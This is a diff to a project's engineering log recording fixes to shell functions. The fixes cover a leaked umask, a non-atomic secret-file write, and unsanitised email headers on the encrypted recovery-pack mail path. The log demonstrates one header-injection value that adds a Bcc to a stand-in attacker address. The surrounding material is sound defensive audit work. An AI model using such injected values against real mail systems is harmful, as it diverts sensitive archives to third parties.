@@ -8839,6 +8839,79 @@ subsumes the other, which is why both are there -- and the guard is the stronger
 form of what three suites already had, since it fails if ANY section mutates in
 place rather than only if the last restore was missed.
 
+---
+
+**"NO CONSEQUENTIAL NAMES REMAIN" WAS A CLASSIFICATION, NOT A MEASUREMENT, AND
+IT WAS WRONG.** Having closed the names I had judged consequential, I wrote that
+what was left is "reporting, configuration and doctor helpers -- none of it a
+safety control". Re-assessed 2026-11-12 by what each remaining function TOUCHES,
+with comments stripped: **20 of the 68 reach deletion, a gate, or a write**,
+including the writer for every file under the secrets directory and the
+encrypted recovery pack's only off-host route.
+
+The error is the one this file keeps recording in other forms: a verdict reached
+by sorting things into categories rather than by looking at what they do. The
+list header now carries the measurement and the order to work in, so the next
+session does not have to re-derive it -- and the two sharpest are fixed below.
+
+**`write_secret_file` SET THE WHOLE PROCESS'S UMASK, AND COULD LEAVE A
+ZERO-BYTE CREDENTIAL.** It writes every file under the secrets directory and no
+test had ever driven it. Measured:
+
+```
+umask before            0022
+umask after             0077      <- a function-scoped umask is NOT scoped
+an ordinary file made afterwards  600, where 644 was intended
+```
+
+`umask` is not local to a function, so the bare form leaked to the rest of the
+process and silently tightened every later file. And `printf ... > "$path"`
+truncates BEFORE it writes, so an interruption left a **zero-byte secret** --
+which is precisely the condition `checkup` exists to report, created by the
+write path itself. The umask is set in a SUBSHELL now, and the write is staged
+beside the target and renamed, so the live file is either the old secret or the
+new one. Both directions are pinned, and the mutation for the second uses the
+**INODE** as its observable: a rename gives the file a new inode, an in-place
+rewrite keeps it. My first attempt stubbed `printf` to fail, which also broke
+the STAGING, so the function died before reaching the mutated write and the
+mutant looked safe -- name the observable the mutation actually changes.
+
+**THE ENCRYPTED RECOVERY PACK'S ONLY OFF-HOST ROUTE DID NOT SANITISE ITS
+HEADERS, WHILE THE SIBLING MAIL PATH IN THE SAME FILE DID.**
+`mreport_header_safe` is defined at line 7504 and used by the weekly report's
+mail path at 7513-7518; `send_recovery_pack_email` sits at 5574 and interpolated
+`RECOVERY_PACK_EMAIL_FROM`, `_TO` and the archive basename straight into
+headers. Demonstrated:
+
+```
+RECOVERY_PACK_EMAIL_TO = $'victim@example.invalid\nBcc: attacker@example.invalid'
+  ->  To: victim@example.invalid
+      Bcc: attacker@example.invalid      <- a real header, in the message
+                                            carrying the encrypted pack
+```
+
+**Stated at its real size: this is not a privilege boundary.** The config is
+`0600 root`, so anyone who can set that value already has root. What it is, is
+an injection hole in the one path that sends the artefact which makes every
+other off-site copy openable -- in a project that deliberately did NOT copy
+exactly this hole from `domum-core`, and whose other mail path already had the
+fix. A pasted value with a stray newline is the realistic trigger.
+
+**AND A FAILED SEND LEFT THE WHOLE BASE64 PACK IN THE TEMP DIRECTORY.** The
+first fix was a `trap ... RETURN`, which is wrong: `smtp_send_message` **dies**,
+and `die` exits the process, so neither a RETURN trap nor a `||` in the caller
+can run. Measured -- the trap fired on success and not on the die path, leaving
+one file behind. The only cleanup that works is **not creating the file**:
+`smtp_transport_problem` is now the one implementation of "can mail leave this
+host", `smtp_send_message` enforces it by dying exactly as before (its wording
+unchanged, asserted), and the pack sender consults it BEFORE building anything.
+All three paths -- success, no host, no credential -- now leave nothing behind.
+
+That is the "refuse before you break something" shape this file already records
+for the `immich reset-db` preflight, arriving at a temp file instead of a
+container: when the failure path cannot clean up, move the check before the
+thing that would need cleaning.
+
 ## 15. Known open safety defects
 
 Documented here because they constrain what is safe to do. Remove an entry when
